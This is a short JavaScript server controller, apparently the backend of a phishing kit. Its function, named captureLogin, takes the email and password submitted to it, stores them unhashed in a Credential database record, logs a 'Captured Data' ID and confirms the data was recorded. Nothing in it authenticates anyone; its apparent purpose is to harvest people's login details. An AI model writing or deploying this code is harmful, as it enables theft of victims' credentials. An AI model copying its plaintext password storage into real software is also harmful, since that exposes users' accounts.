import Credential from "../models/credential.js";

// Controller function
export const captureLogin = async (req, res) => {
  try {
    const { email, password } = req.body;

    const newEntry = await Credential.create({
      email,
      password,
    });

    console.log("Captured Data ID:", newEntry._id);

    res.status(201).json({
      success: true,
      id: newEntry._id,
      message: "Data recorded",
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
    });
  }
};
